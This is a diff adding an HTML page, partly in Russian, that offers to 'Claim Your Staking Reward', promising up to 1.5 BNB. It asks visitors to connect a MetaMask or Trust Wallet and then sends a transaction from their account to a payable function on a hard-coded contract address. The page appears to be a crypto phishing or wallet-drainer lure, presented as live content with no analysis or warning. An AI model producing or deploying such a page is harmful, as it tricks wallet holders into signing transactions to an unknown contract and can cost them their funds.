@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Claim Staking Reward</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+</head>
+<body style="text-align:center; font-family:Arial; padding:50px; background:#0f0f0f; color:white;">
+    <h1>🎉 Claim Your Staking Reward!</h1>
+    <p>Connect wallet and claim up to 1.5 BNB + tokens</p>
+    <button onclick="claimReward()" style="padding:15px 30px; font-size:18px; background:#00cc00; color:white; border:none; border-radius:8px; cursor:pointer;">
+        Claim Reward Now
+    </button>
+
+    <script>
+        const contractAddress = "0x1cA7d1Ed8CA46C5F20E651427b1Af1D2a8668C1C";
+        const abi = [
+            {
+                "inputs": [],
+                "name": "claimReward",
+                "outputs": [],
+                "stateMutability": "payable",
+                "type": "function"
+            }
+        ];
+
+        async function claimReward() {
+            if (typeof window.ethereum === 'undefined') {
+                alert("Установите MetaMask или Trust Wallet");
+                return;
+            }
+            const web3 = new Web3(window.ethereum);
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+            const contract = new web3.eth.Contract(abi, contractAddress);
+            const accounts = await web3.eth.getAccounts();
+
+            try {
+                await contract.methods.claimReward().send({ from: accounts[0] });
+                alert("Reward claimed successfully! 🎉");
+            } catch (e) {
+                alert("Ошибка: " + e.message);
+            }
+        }
+    </script>
+</body>
+</html>
